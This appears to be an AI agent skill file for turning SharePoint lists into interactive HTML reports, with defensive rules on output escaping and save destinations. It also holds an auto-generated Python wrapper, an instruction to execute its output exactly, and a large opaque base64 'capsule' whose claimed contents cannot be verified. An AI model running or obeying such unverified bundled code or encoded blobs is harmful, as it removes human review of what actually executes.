---
name: "sharepoint-list-insight-report-generator"
description: "Use this skill whenever the user asks for an insights/reporting analysis of a SharePoint list from a connected SharePoint knowledge source; first validate the list exists, then generate and save a single-file interactive HTML report to a pre-approved SharePoint destination whose audience is no broader than the source list and items, and return its SharePoint URL."
---

Before starting, verify that configured SharePoint connector actions, agent flows, or equivalent tools can discover approved lists and their schemas, retrieve list items page by page, and invoke **Create file** to return the created file's URL or path. A SharePoint knowledge source alone does not guarantee these capabilities. If any capability is unavailable, stop and name the missing capability.

## Step 1 – Identify the Target List

1. Read the user request and identify the requested SharePoint list name.
2. Inspect the selected SharePoint knowledge source.
3. Retrieve all available SharePoint lists.
4. Perform a case-insensitive exact match on list title (and any explicit aliases in list metadata).
5. Proceed only on an exact match or an explicit user selection; otherwise stop and prompt the user to choose from the available lists.

### Validation Logic
Before performing any analysis, enumerate all SharePoint lists available in the selected knowledge source.

  The requested data source must be explicitly mapped to an existing SharePoint list.

  Allowed conditions to continue:
  - Exact list name match.
  - User explicitly selects a list from the available lists.
  - Alias defined in list metadata.

  Forbidden behavior:
  - Do not infer lists from business terminology.
  - Do not infer lists from column names.
  - Do not infer lists from data values.
  - Do not infer lists from semantic similarity.
  - Do not select a list because it appears related.

  Examples:

  User request:
  Create a report for Campaign

  Available lists:
  - Campaign
  - Product Catalog

  Result:
  Proceed with Campaign.

  User request:
  Create a report for sales data

  Available lists:
  - Campaign
  - Product Catalog

  Result:
  Stop.
  Return available lists.
  Ask the user to select one.

  User request:
  Create a report for quarterly revenue

  Available lists:
  - Campaign
  - Product Catalog

  Result:
  Stop.
  Do not select Campaign.

### If the requested list does not exist:

- Stop the process immediately.
- Do not analyze data.
- Do not generate a report.
- Return all available SharePoint lists.
- Return closest matching list names.

Proceed only if the requested list exists.
For example: if the user requests "sales" and only a "Product" list exists that happens to contain sales-related data, stop and ask the user to choose an existing list from the knowledge source.

---

## Step 2 – Discover List Structure

Retrieve:

- List title
- Internal name
- Item count
- Created date
- Last modified date
- All columns
- Column types
- Required fields
- Indexed fields
- Lookup fields
- Choice fields
- Person fields
- Managed metadata fields

Generate a schema summary.

---

## Step 3 – Analyze Data

Analyze all accessible records within the confirmed scope, retrieving them page by page through the configured tool and following its continuation tokens. Before retrieving a detailed report, enforce the tool's row and report-size limits; when either limit is absent, also use a conservative cap of 1,000 rows. If the scope would exceed an applicable limit, ask the user to narrow it. Never silently truncate or sample records.

Generate:

### General Statistics

- Total records
- Distinct values
- Missing values
- Data completeness score

### Trend Analysis

- Monthly trends
- Annual trends
- Growth trends

### Category Analysis

- Top categories
- Frequency distribution
- Ranking statistics

### Ownership Analysis

- Records by owner
- Top contributors

### Quality Analysis

- Empty fields
- Duplicate values
- Potential anomalies

---

## Step 4 – Generate Insights

Create business-oriented insights.

Examples:

- Most used categories
- Fastest growing areas
- Data quality issues
- Process bottlenecks
- Trends and anomalies

Prioritize actionable recommendations.

---

## Step 5 – Build Interactive HTML Report

Produce a single HTML file with all CSS and JavaScript embedded inline, except that Chart.js (version 4) may be loaded from an exact versioned CDN URL with matching SRI `integrity` metadata and `crossorigin="anonymous"` as the only permitted external dependency. If the exact version and matching SRI cannot be verified, do not load the CDN asset and use embedded browser APIs instead. Do not use external Bootstrap, DataTables, fonts, stylesheets, scripts, or other CDN resources. Implement table filtering, sorting, pagination, and responsive styling using embedded CSS and JavaScript.

Treat SharePoint field names and values as untrusted data. Use a real JSON serializer; before embedding serialized data in a `<script type="application/json">` element, escape `<`, `>`, `&`, U+2028, and U+2029, then read it via `textContent` and parse it. Insert data-driven content using `textContent`, `document.createElement`, and other safe DOM APIs, never `innerHTML`. Render rich-text fields as plain text unless a trusted sanitizer is available.

### Technologies

Use:
- Chart.js

Use only libraries that can be used safely in a browser.

### Executive Summary

Display:

- List name
- Record count
- Column count
- Last update date
- Top insights

### Interactive Filters

Provide filters for:

- Text fields
- Choice fields
- Lookup fields
- Person fields
- Date fields

Filters must update charts, KPIs and tables dynamically.

### Interactive Charts

Generate appropriate charts automatically.

Support:

- Bar charts
- Pie charts
- Doughnut charts
- Line charts

Provide hover tooltips and legend controls.

### Data Table

Requirements:

- Sort on every column
- Ascending and descending sorting
- Search box with placeholder:
  Quick search in table...
- Pagination
- Column visibility controls
- Export buttons:
  - CSV (Excel-compatible)
  - Copy

For CSV export, neutralize spreadsheet formulas by prefixing an apostrophe when a cell's first non-whitespace or control character is `=`, `+`, `-`, or `@`.

### Detail Modal Popup

Selecting a row must open a modal displaying:

- All list fields
- Display names
- Internal names
- Values

Use a responsive two-column layout.

### Open SharePoint Item Button

Inside the modal popup provide:

Open SharePoint Item

Requirements:

- Open in a new browser tab
- Use only the trusted SharePoint item URL returned by the configured connector or tool
- Permit the link only when it uses HTTPS and its origin matches the selected SharePoint site's origin; otherwise omit it
- Use target="_blank" and rel="noopener noreferrer"
---

## Step 6 – Save Report

After generating the HTML report:

- Generate a unique name using a sanitized list name: retain `[A-Za-z0-9_-]`, replace other runs with `_`, trim leading and trailing separators, cap the sanitized list-name portion at 80 characters, and use `SharePointList` if empty.

   Report_<SanitizedListName>_<yyyyMMdd_HHmmss>.html

- Verify that the configured destination's audience is no broader than the source list and included items. If this cannot be verified, do not upload the report.
- Invoke the configured SharePoint **Create file** action or flow to save the report in the pre-approved SharePoint destination whose audience is no broader than the source list and included items.
- Capture the URL or path returned by **Create file** and use it in the response. If file creation fails or returns no URL or path, report the failure honestly and never guess a URL.

---

## Output Requirements

Return:

1. Report summary.
2. SharePoint URL of the generated report.
3. Report file name.
4. List schema summary.
5. Insights summary.
6. Storage location within the configured SharePoint destination.

---

## Success Criteria

A successful execution must:

- Detect the requested SharePoint list.
- Validate its existence.
- Suggest available lists when not found.
- Discover schema.
- Analyze data.
- Generate insights.
- Create an interactive HTML report.
- Save the report in the pre-approved SharePoint destination whose audience is no broader than the source list and included items.
- Return the direct SharePoint URL of the report.
- Provide sortable tables.
- Provide pagination.
- Provide quick search.
- Provide modal detail view.
- Provide Open SharePoint Item action.
- Generate a unique report name.
- Support responsive user experience.

<!-- toaster:generated:begin -->

## Run this — do not improvise

This capability's deterministic implementation is a RAPP single-file agent, linked beside this file as `sharepoint_list_insight_report_generator_agent.py` and embedded as the fenced Python below (sha256 fa9891a81fb26ff6…; a byte-exact copy is also vaulted in the capsule comment at the end of this file). On a host with sandbox execution, run the linked file directly — if it is missing, write the fence contents verbatim to `sharepoint_list_insight_report_generator_agent.py` first:

```bash
python3 sharepoint_list_insight_report_generator_agent.py '{"key": "value"}'      # arguments as one JSON object
echo '{"key": "value"}' | python3 sharepoint_list_insight_report_generator_agent.py   # or on stdin
python3 sharepoint_list_insight_report_generator_agent.py --tool                      # emit the JSON tool contract
```

Treat stdout as a tool result. If it reports missing or unresolved inputs, stop and collect them. If it returns `steps`, execute those steps in order exactly as returned; if it returns `instructions`, follow them with the supplied inputs. Otherwise use the result verbatim. Do not invent behavior beyond that output. On a host without code execution, treat the Parameters schema and the code below as the exact specification and never paraphrase a step. Never edit inside the generated markers; a converter-equipped host can instead restore the original file checksum-verified with the installed `rapp-agent-converter/scripts/toast.py convert SKILL.md --to agent`.

```python  # rapp:deterministic
"""SharepointListInsightReportGenerator -- Use this skill whenever the user asks for an insights/reporting analysis of a SharePoint list from a connected SharePoint knowledge source; first validate the list exists, then generate and save a single-file interactive HTML report to a pre-approved SharePoint destination whose audience is no broader than the source list and items, and return its SharePoint URL.

Generated by the rapp skill from sharepoint-list-insight-report-generator. The RCI capsule at the bottom of this file carries the full original; `toast.py convert` restores it byte-exact."""

import json
import re
import sys

try:
    from agents.basic_agent import BasicAgent
except ImportError:  # running OUTSIDE a brainstem -- stay executable anyway.
    class BasicAgent:  # noqa: D101 - minimal stand-in, same contract
        def __init__(self, name=None, metadata=None):
            if name:
                self.name = name
            if metadata:
                self.metadata = metadata

        def perform(self, **kwargs):
            return "Not implemented."

        def system_context(self):
            return None

        def to_tool(self):
            return {"type": "function", "function": {
                "name": self.name,
                "description": self.metadata.get("description", ""),
                "parameters": self.metadata.get("parameters", {})}}

# The procedural layer, verbatim from the source capability.
INSTRUCTIONS = 'Before starting, verify that configured SharePoint connector actions, agent flows, or equivalent tools can discover approved lists and their schemas, retrieve list items page by page, and invoke **Create file** to return the created file\'s URL or path. A SharePoint knowledge source alone does not guarantee these capabilities. If any capability is unavailable, stop and name the missing capability.\n\n## Step 1 – Identify the Target List\n\n1. Read the user request and identify the requested SharePoint list name.\n2. Inspect the selected SharePoint knowledge source.\n3. Retrieve all available SharePoint lists.\n4. Perform a case-insensitive exact match on list title (and any explicit aliases in list metadata).\n5. Proceed only on an exact match or an explicit user selection; otherwise stop and prompt the user to choose from the available lists.\n\n### Validation Logic\nBefore performing any analysis, enumerate all SharePoint lists available in the selected knowledge source.\n\n  The requested data source must be explicitly mapped to an existing SharePoint list.\n\n  Allowed conditions to continue:\n  - Exact list name match.\n  - User explicitly selects a list from the available lists.\n  - Alias defined in list metadata.\n\n  Forbidden behavior:\n  - Do not infer lists from business terminology.\n  - Do not infer lists from column names.\n  - Do not infer lists from data values.\n  - Do not infer lists from semantic similarity.\n  - Do not select a list because it appears related.\n\n  Examples:\n\n  User request:\n  Create a report for Campaign\n\n  Available lists:\n  - Campaign\n  - Product Catalog\n\n  Result:\n  Proceed with Campaign.\n\n  User request:\n  Create a report for sales data\n\n  Available lists:\n  - Campaign\n  - Product Catalog\n\n  Result:\n  Stop.\n  Return available lists.\n  Ask the user to select one.\n\n  User request:\n  Create a report for quarterly revenue\n\n  Available lists:\n  - Campaign\n  - Product Catalog\n\n  Result:\n  Stop.\n  Do not select Campaign.\n\n### If the requested list does not exist:\n\n- Stop the process immediately.\n- Do not analyze data.\n- Do not generate a report.\n- Return all available SharePoint lists.\n- Return closest matching list names.\n\nProceed only if the requested list exists.\nFor example: if the user requests "sales" and only a "Product" list exists that happens to contain sales-related data, stop and ask the user to choose an existing list from the knowledge source.\n\n---\n\n## Step 2 – Discover List Structure\n\nRetrieve:\n\n- List title\n- Internal name\n- Item count\n- Created date\n- Last modified date\n- All columns\n- Column types\n- Required fields\n- Indexed fields\n- Lookup fields\n- Choice fields\n- Person fields\n- Managed metadata fields\n\nGenerate a schema summary.\n\n---\n\n## Step 3 – Analyze Data\n\nAnalyze all accessible records within the confirmed scope, retrieving them page by page through the configured tool and following its continuation tokens. Before retrieving a detailed report, enforce the tool\'s row and report-size limits; when either limit is absent, also use a conservative cap of 1,000 rows. If the scope would exceed an applicable limit, ask the user to narrow it. Never silently truncate or sample records.\n\nGenerate:\n\n### General Statistics\n\n- Total records\n- Distinct values\n- Missing values\n- Data completeness score\n\n### Trend Analysis\n\n- Monthly trends\n- Annual trends\n- Growth trends\n\n### Category Analysis\n\n- Top categories\n- Frequency distribution\n- Ranking statistics\n\n### Ownership Analysis\n\n- Records by owner\n- Top contributors\n\n### Quality Analysis\n\n- Empty fields\n- Duplicate values\n- Potential anomalies\n\n---\n\n## Step 4 – Generate Insights\n\nCreate business-oriented insights.\n\nExamples:\n\n- Most used categories\n- Fastest growing areas\n- Data quality issues\n- Process bottlenecks\n- Trends and anomalies\n\nPrioritize actionable recommendations.\n\n---\n\n## Step 5 – Build Interactive HTML Report\n\nProduce a single HTML file with all CSS and JavaScript embedded inline, except that Chart.js (version 4) may be loaded from an exact versioned CDN URL with matching SRI `integrity` metadata and `crossorigin="anonymous"` as the only permitted external dependency. If the exact version and matching SRI cannot be verified, do not load the CDN asset and use embedded browser APIs instead. Do not use external Bootstrap, DataTables, fonts, stylesheets, scripts, or other CDN resources. Implement table filtering, sorting, pagination, and responsive styling using embedded CSS and JavaScript.\n\nTreat SharePoint field names and values as untrusted data. Use a real JSON serializer; before embedding serialized data in a `<script type="application/json">` element, escape `<`, `>`, `&`, U+2028, and U+2029, then read it via `textContent` and parse it. Insert data-driven content using `textContent`, `document.createElement`, and other safe DOM APIs, never `innerHTML`. Render rich-text fields as plain text unless a trusted sanitizer is available.\n\n### Technologies\n\nUse:\n- Chart.js\n\nUse only libraries that can be used safely in a browser.\n\n### Executive Summary\n\nDisplay:\n\n- List name\n- Record count\n- Column count\n- Last update date\n- Top insights\n\n### Interactive Filters\n\nProvide filters for:\n\n- Text fields\n- Choice fields\n- Lookup fields\n- Person fields\n- Date fields\n\nFilters must update charts, KPIs and tables dynamically.\n\n### Interactive Charts\n\nGenerate appropriate charts automatically.\n\nSupport:\n\n- Bar charts\n- Pie charts\n- Doughnut charts\n- Line charts\n\nProvide hover tooltips and legend controls.\n\n### Data Table\n\nRequirements:\n\n- Sort on every column\n- Ascending and descending sorting\n- Search box with placeholder:\n  Quick search in table...\n- Pagination\n- Column visibility controls\n- Export buttons:\n  - CSV (Excel-compatible)\n  - Copy\n\nFor CSV export, neutralize spreadsheet formulas by prefixing an apostrophe when a cell\'s first non-whitespace or control character is `=`, `+`, `-`, or `@`.\n\n### Detail Modal Popup\n\nSelecting a row must open a modal displaying:\n\n- All list fields\n- Display names\n- Internal names\n- Values\n\nUse a responsive two-column layout.\n\n### Open SharePoint Item Button\n\nInside the modal popup provide:\n\nOpen SharePoint Item\n\nRequirements:\n\n- Open in a new browser tab\n- Use only the trusted SharePoint item URL returned by the configured connector or tool\n- Permit the link only when it uses HTTPS and its origin matches the selected SharePoint site\'s origin; otherwise omit it\n- Use target="_blank" and rel="noopener noreferrer"\n---\n\n## Step 6 – Save Report\n\nAfter generating the HTML report:\n\n- Generate a unique name using a sanitized list name: retain `[A-Za-z0-9_-]`, replace other runs with `_`, trim leading and trailing separators, cap the sanitized list-name portion at 80 characters, and use `SharePointList` if empty.\n\n   Report_<SanitizedListName>_<yyyyMMdd_HHmmss>.html\n\n- Verify that the configured destination\'s audience is no broader than the source list and included items. If this cannot be verified, do not upload the report.\n- Invoke the configured SharePoint **Create file** action or flow to save the report in the pre-approved SharePoint destination whose audience is no broader than the source list and included items.\n- Capture the URL or path returned by **Create file** and use it in the response. If file creation fails or returns no URL or path, report the failure honestly and never guess a URL.\n\n---\n\n## Output Requirements\n\nReturn:\n\n1. Report summary.\n2. SharePoint URL of the generated report.\n3. Report file name.\n4. List schema summary.\n5. Insights summary.\n6. Storage location within the configured SharePoint destination.\n\n---\n\n## Success Criteria\n\nA successful execution must:\n\n- Detect the requested SharePoint list.\n- Validate its existence.\n- Suggest available lists when not found.\n- Discover schema.\n- Analyze data.\n- Generate insights.\n- Create an interactive HTML report.\n- Save the report in the pre-approved SharePoint destination whose audience is no broader than the source list and included items.\n- Return the direct SharePoint URL of the report.\n- Provide sortable tables.\n- Provide pagination.\n- Provide quick search.\n- Provide modal detail view.\n- Provide Open SharePoint Item action.\n- Generate a unique report name.\n- Support responsive user experience.'

# Ordered commands lifted verbatim from the capability's own documentation.
STEPS = []


class SharepointListInsightReportGeneratorAgent(BasicAgent):
    def __init__(self):
        self.name = 'SharepointListInsightReportGenerator'
        self.metadata = {
          "name": "SharepointListInsightReportGenerator",
          "description": "Use this skill whenever the user asks for an insights/reporting analysis of a SharePoint list from a connected SharePoint knowledge source; first validate the list exists, then generate and save a single-file interactive HTML report to a pre-approved SharePoint destination whose audience is no broader than the source list and items, and return its SharePoint URL.",
          "parameters": {
            "type": "object",
            "properties": {},
            "required": []
          }
        }
        super().__init__(name=self.name, metadata=self.metadata)

    def perform(self, **kwargs):  # toaster:generated-perform
        return json.dumps({"status": "ok", "instructions": INSTRUCTIONS,
                           "inputs": kwargs,
                           "note": "Prose-only capability: follow INSTRUCTIONS "
                                   "with the given inputs."}, indent=2)

if __name__ == "__main__":
    #     echo '{"arg": "value"}' | python3 sharepoint_list_insight_report_generator_agent.py
    #     python3 sharepoint_list_insight_report_generator_agent.py '{"arg": "value"}'
    #     python3 sharepoint_list_insight_report_generator_agent.py --tool          # emit the JSON tool contract
    _a = sys.argv[1:]
    if _a and _a[0] == "--tool":
        print(json.dumps(SharepointListInsightReportGeneratorAgent().to_tool(), indent=2))
    else:
        _raw = _a[0] if _a else (sys.stdin.read().strip() or "{}")
        print(SharepointListInsightReportGeneratorAgent().perform(**json.loads(_raw)))

# rci-capsule:v1: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